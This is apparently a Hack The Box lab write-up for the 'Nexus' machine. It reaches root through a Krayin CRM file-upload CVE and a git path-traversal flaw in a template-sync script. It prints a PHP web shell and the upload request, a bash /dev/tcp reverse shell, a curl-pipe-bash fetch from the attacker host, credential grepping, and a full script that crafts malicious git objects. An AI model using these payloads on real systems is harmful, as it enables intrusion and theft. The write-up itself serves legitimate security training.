# Nexus
#HTB #easy #guided-mode #reverse-shell #networks-services #CVE #authentication #burp-suite #ncat #Web #privilege-escalation #Git
## Target:
*Name:* Nexus

*IP:* 10.129.76.128

## Vulnerability:

- Gitea commit history exposed credentials for the Krayin account, which was vulnerable to a known CVE allowing malicious PHP file upload and resulting in a reverse shell.
- `template-sync.py`'s unsafe Git object manipulation allowed an SSH key pair to be added to root's `authorized_keys`, enabling SSH access as root.

## Steps:

#### 1) Reconnaissance

**Code:**

```
nmap -sV 10.129.76.128
```

**Result:**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:12 -0400
Nmap scan report for 10.129.76.128
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```

#### 2) Investigating the web application

We attempted to access the web application hosted on the machine using `http://10.129.76.128`. However, we were redirected to `http://nexus.htb`, which was inaccessible because the hostname was not resolved. We therefore added `nexus.htb` to `/etc/hosts` to resolve it to the target IP address.

**Result:**

<img width="2559" height="1352" alt="image" src="https://github.com/user-attachments/assets/cdbc0ae6-fa0a-415d-844b-05299529dee5" />

#### 3) Virtual hosts enumeration

We used `gobuster` to find available virtual hosts on the target server:

**Code:**

```
gobuster vhost -u http://nexus.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
```

**Result:**

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://nexus.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/dirb/common.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
.git/HEAD.nexus.htb Status: 400 [Size: 166]
.svn/entries.nexus.htb Status: 400 [Size: 166]
@.nexus.htb Status: 400 [Size: 166]
_vti_bin/_vti_adm/admin.dll.nexus.htb Status: 400 [Size: 166]
_vti_bin/_vti_aut/author.dll.nexus.htb Status: 400 [Size: 166]
_vti_bin/shtml.dll.nexus.htb Status: 400 [Size: 166]
cgi-bin/.nexus.htb Status: 400 [Size: 166]
CVS/Entries.nexus.htb Status: 400 [Size: 166]
CVS/Repository.nexus.htb Status: 400 [Size: 166]
CVS/Root.nexus.htb Status: 400 [Size: 166]
Documents and Settings.nexus.htb Status: 400 [Size: 166]
git.nexus.htb Status: 200 [Size: 14474]
billing.nexus.htb Status: 302 [Size: 390] [--> http://billing.nexus.htb/admin/login]
Program Files.nexus.htb Status: 400 [Size: 166]
reports list.nexus.htb Status: 400 [Size: 166]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

We have 2 important findings:
- `git.nexus.htb`: returned a status code of 200 (FOUND), indicating that the virtual host is active and accessible.
- `billing.nexus.htb`: returned a status code of 302 (REDIRECT), redirecting to `http://billing.nexus.htb/admin/login`, which reveals an `/admin/login` endpoint.
- 
We'll investigate both of them.

#### 4) Exploring the Git VHost

After adding `git.nexus.htb` to `/etc/hosts`, we investigated the Git virtual host.

Firstly, we accessed to it using the URL: `http://git.nexus.htb`.

**Result:**

<img width="2555" height="1300" alt="image" src="https://github.com/user-attachments/assets/85934834-d591-44fe-a642-6f73b20dc561" />

> [!NOTE]
> Gitea is a **self-hosted service for hosting and managing Git repositories**. It provides a web interface where users can **create, view, and manage repositories and their changes**.

Second, we enumerated the `git.nexus.htb` vhost.

**Code:**

```
gobuster dir -u http://git.nexus.htb -w /usr/share/wordlists/dirb/common.txt
```

**Result:**

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://git.nexus.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Admin                (Status: 200) [Size: 22803]
admin                (Status: 200) [Size: 22803]
ADMIN                (Status: 200) [Size: 22803]
explore              (Status: 303) [Size: 41] [--> /explore/repos]
favicon.ico          (Status: 301) [Size: 58] [--> /assets/img/favicon.png]
issues               (Status: 303) [Size: 60] [--> /user/login?redirect_to=%2Fissues]
notifications        (Status: 303) [Size: 67] [--> /user/login?redirect_to=%2Fnotifications]
sitemap.xml          (Status: 200) [Size: 277]
v2                   (Status: 401) [Size: 49]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```
The enumeration revealed the presence of an `admin` directory on the virtual host.

We accessed to it using the browser:

<img width="2551" height="877" alt="image" src="https://github.com/user-attachments/assets/428ea381-0683-49d6-b513-5b168279d595" />

While investigating the repository `krayin-docker-setup`, we found the following information:

<img width="796" height="430" alt="image" src="https://github.com/user-attachments/assets/62edb714-8db0-496b-b39d-99501682b5b2" />

The commit history revealed changes to the files, which led to the discovery of a password.

#### 5) Exploring the billing vhost

Next, we proceed to add the `billing` vhost to our hosts list, then access to it.

**Screenshot:**

<img width="1040" height="1027" alt="image" src="https://github.com/user-attachments/assets/98d0c62d-ea85-4f07-96e2-fdcc55d230ec" />

We got redirected to Krayin login.
We proceed to access it using the email we found earlier for the hiring manager and the password from the earlier `.env` file.

**Screenshot:**

<img width="2553" height="1266" alt="image" src="https://github.com/user-attachments/assets/984a2af1-109f-48a1-a575-f8bdc71e1a04" />

#### 6) CVE-2026-38526
Next, we searched for vulnerabilities related to `Krayin` application. We found a critical vulnerability with 9.9 CVSS score: `CVE-2026-38526`.
CVE-2026-38526 is a critical authenticated remote code execution vulnerability affecting Webkul Krayin CRM v2.2.x. The vulnerability exists in the TinyMCE media upload endpoint `/admin/tinymce/upload`, which fails to validate uploaded file types. An authenticated attacker can upload a malicious PHP file and execute arbitrary commands on the server.

**Source:** [CVE-2026-38526-PoC](https://github.com/NathanHimself/CVE-2026-38526-PoC)

#### 7) Reverse Shell

We exploited the `CVE-2026-38526` vulnerability by uploading a PHP file containing the following code:

```php
<?php system($_GET["cmd"]); ?>
```

using the following HTTP POST request:

```http
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
Content-Length: 342
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygQi5PfSLhxJhdw1G
Accept: */*
Origin: http://billing.nexus.htb
Referer: http://billing.nexus.htb/admin/mail/sent
Accept-Encoding: gzip, deflate, br
Cookie: <COOKIE>
Connection: keep-alive

------WebKitFormBoundarygQi5PfSLhxJhdw1G
Content-Disposition: form-data; name="_token"

4Q8hUETxJ3HfPFZxYsOB81heK5RXYK3xLEQitIhE
------WebKitFormBoundarygQi5PfSLhxJhdw1G
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundarygQi5PfSLhxJhdw1G
```

**Result:**

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Content-Type: application/json
Connection: keep-alive
Cache-Control: no-cache, private
Date: Sun, 16 Aug 2026 15:49:13 GMT
phpdebugbar-id: 01M05M6HR9RJ0N22YQ3A1JH1BP
Set-Cookie: <COOKIE>
Content-Length: 97

{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/e3dad298e93360d2d35d709b6b488086.php"}
```

We successfully uploaded the malicious code, giving us remote command execution through the `cmd` parameter.

Next, we opened a python server, on port 1330, that will serve the following payload (`shell.sh`) to the target machine:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.75/8000 0>&1
```

After that, we opened a listener on port 8000.

Finally, we used the uploaded payload to initialize the reverse shell:

```
http://billing.nexus.htb//storage//tinymce//e3dad298e93360d2d35d709b6b488086.php?cmd=curl%2010.10.14.75:1330/shell.sh%20|%20bash
```

This will download the script on the target machine and execute it with bash
(more explanation on [Three](./../Boxes/Three))

#### 8) Investigating the target machine

After obtaining a remote shell on the target machine, we were operating as the `www-data` user.

We started by investigating `/etc/passwd` file, and we found the following information:

```
jones:x:1000:1000:,,,:/home/jones:/bin/bash
```

This indicates that the target machine has a user account with username `jones`.
We tried to login to SSH using the username `jones`, and the password we found earlier, `N27xh!!2ucY04`, but the login failed.

Next, we used `grep` to search for more passwords:

**Code:**
```
grep -Rni "password" /var/www 2>/dev/null
```

**Result:**
This revealed a database password stored in the application's `.env` file:
```
/var/www/krayin/.env:21:DB_PASSWORD=<PASSWORD>
```

With this password we successfully logged in to SSH with `jones` username:
```
┌──(_______________)-[~]
└─$ ssh jones@10.129.76.128   
The authenticity of host '10.129.76.128 (10.129.76.128)' can't be established.
ED25519 key fingerprint is: SHA256:<REDACTED>
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.78.101' (ED25519) to the list of known hosts.
jones@10.129.78.101's password: (<PASSWORD>)
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug 16 04:22:18 PM UTC 2026

  System load:           0.0
  Usage of /:            66.7% of 6.48GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.78.101
  IPv6 address for eth0: dead:beef::a0de:adff:fef4:9dc2


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
jones@nexus:~$
```

#### 9) Finding user flag
```
jones@nexus:~$ ls
user.txt
jones@nexus:~$ cat user.txt
<USER_FLAG>
```

#### 10) Privilege escalation
Investigating further, we found a `systemd` timer running a template sync service every 2 minutes.
```
jones@nexus:~$ systemctl list-timers
NEXT LEFT UNIT ACTIVATES
Thu 2026-08-21 18:02:00 UTC 1min gitea-template-sync.timer gitea-template-
sync.service
```

Reading the sync script at `/etc/gitea/template-sync.py` reveals that it clones all template repositories, and syncs their file contents to `/home/git/template-staging/<owner>/<repo>/` . 
The critical vulnerability is in how it processes file paths from `git ls-tree`, it uses `os.path.join()` on the raw file paths without sanitizing directory traversal.

Since git ls-tree outputs paths containing `..` without validation, and `os.path.join()` resolves them, we can write files anywhere the git user has access. The staging directory is at `/home/git/template-staging/<owner>/<repo>/`, so we need 5 levels of `..` to reach `/root/`. 
Then we can write an SSH key to `.ssh/authorized_keys` and use it to get remote access to the machine.

First, we generate an SSH key pair locally for our access:
```
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

> [!NOTE]
> ### SSH Key Pair
>
>An SSH key pair has **two keys**:
>
>- **Private key:** kept secret by the user.
>- **Public key:** placed on the server.
>
>The public key is stored in the user's `~/.ssh/authorized_keys` file.
>
>When connecting with SSH, the server checks if the user has the **matching private key**.
>
>If it matches, the user is allowed to log in.

Checking back at Gitea, we tried `jones` username with the known password and get access.

<img width="2544" height="1131" alt="image" src="https://github.com/user-attachments/assets/cdd86bd0-2a1b-473e-a012-f9c7f5e51f55" />

Next, we create a new repository. Ensuring that it is set as a template:

<img width="1901" height="1331" alt="image" src="https://github.com/user-attachments/assets/356b4104-050c-41e4-9ef0-4b495e1b5034" />

Now we clone the repository and use a custom Python script to create raw git objects with `..` path traversal components. Git's normal `verify_path()` checks prevent creating files with `..` in the path, but by writing objects directly to `.git/objects/` we bypass this entirely.

```
$ cd /tmp
$ git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
$ cd rce
$ touch README.md
```
We use the following script ( build.py ) to construct the traversal payload:
```python
#!/usr/bin/env python3

import hashlib
import zlib
import os
import subprocess
import sys
import time


def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()

    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)

    p = os.path.join(d, sha[2:])

    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))

    return sha


def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)


if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)


r = subprocess.run(
    ["cat", "/tmp/.k.pub"],
    capture_output=True,
    text=True
)

if r.returncode != 0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
    sys.exit(1)


key = r.stdout.strip() + "\n"

blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

ssh_t = write_obj(
    entry("100644", "authorized_keys", blob),
    "tree"
)

cur = write_obj(
    entry("40000", ".ssh", ssh_t),
    "tree"
)

fir = write_obj(
    entry("40000", "root", cur),
    "tree"
)

for i in range(4):
    fir = write_obj(
        entry("40000", "..", fir),
        "tree"
    )

root = write_obj(
    entry("100644", "README.md", readme)
    + entry("40000", "..", fir),
    "tree"
)

ts = int(time.time())

c = (
    "tree %s\n"
    "author x <x@x> %d +0000\n"
    "committer x <x@x> %d +0000\n"
    "\n"
    "init\n"
) % (root, ts, ts)

sha = write_obj(c.encode(), "commit")

os.makedirs(
    os.path.join(".git", "refs", "heads"),
    exist_ok=True
)

open(
    os.path.join(".git", "refs", "heads", "main"),
    "w"
).write(sha + "\n")

print("Done: " + sha)
```

> [!NOTE]
> ### What are Git objects? 
>
> Git does not simply store a repository as a collection of normal files. Internally, Git stores information as **objects** inside the `.git/objects/` directory. 
> 
> There are four main types of Git objects: 
> 
> - **Blob**: stores the content of a file. 
> - **Tree**: stores the structure of directories and points to blobs or other trees. 
> - **Commit**: stores information about a version of the repository, including the root tree, author, committer, and message. 
> - **Tag**: stores information about a Git tag and can point to another object. 


> [!NOTE]
> ## Git Object Manipulation Script
>
> This Python script manually creates a Git commit by writing Git objects directly into the `.git` directory. Instead of using normal Git commands such as `git add` and `git commit`, it reproduces part of Git's internal object-storage mechanism.
>
> The goal of the script is to create a specially crafted Git tree containing an SSH `authorized_keys` file and unusual `..` directory entries. This structure can be abused by a vulnerable Git-related service to make a file path resolve outside the expected repository directory.
>
> ### 1. Creating Git objects
>
> The main function responsible for creating Git objects is `write_obj()`:
>
> ```python
> def write_obj(data, t):
> ```
>
> It receives two arguments:
>
> - `data` → the content of the Git object.
> - `t` → the object type, such as `blob`, `tree`, or `commit`.
>
> Git stores different types of objects, mainly **blobs, trees, and commits**.
>
> Before storing an object, Git creates a header containing its type and size. For example, a blob containing `hello` is internally represented approximately as:
>
> ```text
> blob 5\0hello
> ```
>
> The script reproduces this format with:
>
> ```python
> h = ("%s %d" % (t, len(data))).encode() + b"\x00"
> s = h + data
> ```
>
> It then calculates the SHA-1 hash of the resulting data:
>
> ```python
> sha = hashlib.sha1(s).hexdigest()
> ```
>
> This SHA-1 value becomes the identifier of the Git object.
>
> The object is then compressed using zlib and stored in the normal Git object directory:
>
> ```text
> .git/objects/<first two characters>/<remaining characters>
> ```
>
> For example, if an object's SHA-1 hash started with:
>
> ```text
> abcdef123456...
> ```
>
> Git would store the object under:
>
> ```text
> .git/objects/ab/cdef123456...
> ```
>
> The function therefore reproduces the basic way Git stores objects internally.
>
> ---
>
> ### 2. Creating Git tree entries
>
> The `entry()` function creates entries for Git tree objects:
>
> ```python
> def entry(mode, name, sha):
>     return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)
> ```
>
> A Git tree represents a directory. Each entry inside the tree points to another Git object.
>
> For example:
>
> ```python
> entry("100644", "authorized_keys", blob)
> ```
>
> represents a regular file called `authorized_keys`.
>
> The value `100644` indicates a normal file, while `40000` is used for a directory.
>
> This allows the script to construct a complete directory structure by linking different Git objects together.
>
> ---
>
> ### 3. Getting the SSH public key
>
> The script first checks that it is running inside a Git repository:
>
> ```python
> if not os.path.isdir(".git"):
>     print("Run inside git repo")
>     sys.exit(1)
> ```
>
> It then reads an SSH public key from:
>
> ```text
> /tmp/.k.pub
> ```
>
> using:
>
> ```python
> subprocess.run(
>     ["cat", "/tmp/.k.pub"],
>     capture_output=True,
>     text=True
> )
> ```
>
> If the key does not exist, the script suggests generating one with:
>
> ```text
> ssh-keygen -t ed25519 -f /tmp/.k -N ''
> ```
>
> The public key is then stored as a Git blob:
>
> ```python
> blob = write_obj(key.encode(), "blob")
> ```
>
> A **blob** in Git is simply an object used to store file contents.
>
> At this point, the blob contains the SSH public key that will eventually represent the contents of `authorized_keys`.
>
> ---
>
> ### 4. Creating the `authorized_keys` file
>
> The script also creates a blob for a normal README file:
>
> ```python
> readme = write_obj(b"# Template\n", "blob")
> ```
>
> This is not the important part of the exploit. It simply makes the resulting tree contain a normal file as well.
>
> The important object is the SSH key blob.
>
> The script creates a tree containing:
>
> ```text
> authorized_keys
> ```
>
> with:
>
> ```python
> ssh_t = write_obj(
>     entry("100644", "authorized_keys", blob),
>     "tree"
> )
> ```
>
> Conceptually, this tree represents:
>
> ```text
> directory/
> └── authorized_keys
> ```
>
> where the contents of `authorized_keys` are the SSH public key stored in `blob`.
>
> ---
>
> ### 5. Building the directory hierarchy
>
> The script then places this tree inside a directory called `.ssh`:
>
> ```python
> cur = write_obj(
>     entry("40000", ".ssh", ssh_t),
>     "tree"
> )
> ```
>
> The resulting structure is conceptually:
>
> ```text
> .ssh/
> └── authorized_keys
> ```
>
> It then creates another tree containing a directory called `root`:
>
> ```python
> fir = write_obj(
>     entry("40000", "root", cur),
>     "tree"
> )
> ```
>
> So we now have a nested structure similar to:
>
> ```text
> root/
> └── .ssh/
>     └── authorized_keys
> ```
>
> These are not real directories being created on the filesystem. They are **Git tree objects** describing a directory structure.
>
> ---
>
> ### 6. The unusual `..` entries
>
> The most interesting part of the script is:
>
> ```python
> for i in range(4):
>     fir = write_obj(
>         entry("40000", "..", fir),
>         "tree"
>     )
> ```
>
> Normally, `..` represents the parent directory in a filesystem path.
>
> The script deliberately creates Git tree entries named `..`.
>
> This is unusual because Git trees normally contain ordinary directory and file names. The script is therefore creating a specially crafted tree structure rather than a normal repository structure.
>
> The purpose is to influence how a vulnerable application interprets the Git tree when it checks out or processes its contents.
>
> The repeated `..` entries are used to move upward through directories during path resolution.
>
> This can potentially turn a path that should remain inside the repository into a path outside the repository, eventually reaching a sensitive location such as:
>
> ```text
> /root/.ssh/authorized_keys
> ```
>
> This is the key exploitation technique used by the script.
>
> ---
>
> ### 7. Creating the final tree
>
> The final tree contains two entries:
>
> ```python
> root = write_obj(
>     entry("100644", "README.md", readme)
>     + entry("40000", "..", fir),
>     "tree"
> )
> ```
>
> The first entry is a normal file:
>
> ```text
> README.md
> ```
>
> The second entry is the specially crafted `..` directory.
>
> Conceptually, the tree looks something like:
>
> ```text
> .
> ├── README.md
> └── ..
>     └── ...
> ```
>
> The unusual `..` entry is what makes this structure interesting from a security perspective.
>
> Again, the script isn't directly creating `/root/.ssh/authorized_keys` on the filesystem. It is creating a **malicious Git object structure** that can cause a vulnerable Git consumer to interpret the path differently from what was intended.
>
> ---
>
> ### 8. Creating the Git commit
>
> Once the tree has been constructed, the script creates a Git commit:
>
> ```python
> ts = int(time.time())
>
> c = (
>     "tree %s\n"
>     "author x <x@x> %d +0000\n"
>     "committer x <x@x> %d +0000\n"
>     "\n"
>     "init\n"
> ) % (root, ts, ts)
> ```
>
> A Git commit contains information such as:
>
> - the tree representing the repository state
> - the author
> - the committer
> - the timestamp
> - the commit message
>
> The important line is:
>
> ```text
> tree <root SHA>
> ```
>
> This connects the commit to the malicious tree created earlier.
>
> The commit itself is then stored using:
>
> ```python
> sha = write_obj(c.encode(), "commit")
> ```
>
> The script has now created the three important Git object types:
>
> ```text
> Blob
>  ↓
> Tree
>  ↓
> Commit
> ```
>
> More specifically:
>
> ```text
> SSH public key
>       ↓
>     Blob
>       ↓
> authorized_keys
>       ↓
>     Tree
>       ↓
>    .ssh/
>       ↓
>     Tree
>       ↓
>     root/
>       ↓
>     Tree
>       ↓
>    .. entries
>       ↓
> Malicious final Tree
>       ↓
>    Commit
> ```
>
> ---
>
> ### 9. Pointing the `main` branch to the malicious commit
>
> The final step is to make the new commit the head of the `main` branch:
>
> ```python
> os.makedirs(
>     os.path.join(".git", "refs", "heads"),
>     exist_ok=True
> )
>
> open(
>     os.path.join(".git", "refs", "heads", "main"),
>     "w"
> ).write(sha + "\n")
> ```
>
> Git branches are essentially references to commits.
>
> By writing the commit's SHA-1 into:
>
> ```text
> .git/refs/heads/main
> ```
>
> the script manually makes:
>
> ```text
> main → malicious commit
> ```
>
> Therefore, when Git reads the repository's `main` branch, it will find the crafted commit and its associated tree.
>
> ---
>
> ## Overall
>
> The script manually constructs a Git repository history instead of using normal Git commands.
>
> It:
>
> 1. Reads an SSH public key.
> 2. Stores the key as a Git **blob**.
> 3. Creates Git **trees** representing `authorized_keys`, `.ssh`, and `root`.
> 4. Adds specially crafted `..` directory entries.
> 5. Creates a Git **commit** pointing to the malicious tree.
> 6. Makes the `main` branch point to that commit.
>
> The important security concept is the manipulation of **Git's internal tree structure and path traversal**. The script itself does not directly modify `/root/.ssh/authorized_keys`; instead, it prepares a malicious Git repository structure designed to exploit a vulnerable application that processes the repository.
>
> If the vulnerable application checks out or otherwise processes these crafted tree entries without correctly validating paths, the `..` entries can cause files to be written outside the intended repository directory, potentially allowing the attacker's SSH public key to be placed in `/root/.ssh/authorized_keys`. This could then provide SSH access to the root account.

After that, we ran the script, and it succeeded:
```
┌──(__________________)-[/tmp/rce]
└─$ python3 build.py  
Done: 858ae2e2316db763eae4415f87360ecd9255ead5
```

Finally, the newly created commit is pushed to the remote Git repository:
```
git push -u origin main --force
```
Now we can log in to the machine through SSH using our key pair:

**Code:**
```
ssh -i /tmp/.k root@10.129.76.128
```

**Result:**
```
root@nexus:~# 
```
We can now find the root flag in the root directory:

```
root@nexus:~# pwd
/root
root@nexus:~# ls
root.txt
root@nexus:~# cat root.txt
<ROOT_FLAG>
```
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Searching in the internet about the vulnerabilities or suspected behaviors can help exploit and understand them.
- Git commit history can contain sensitive information.
- Enumerating publicly accessible websites can reveal hidden information and potential attack surfaces.
- Git stores commits, trees, and files as objects, which can sometimes be manipulated directly.
- If an attacker can place a public SSH key in a user's `authorized_keys` file, the matching private key can be used to authenticate as that user.
- Understanding the behavior of automated services and scripts can reveal security vulnerabilities that are not obvious from the main application.
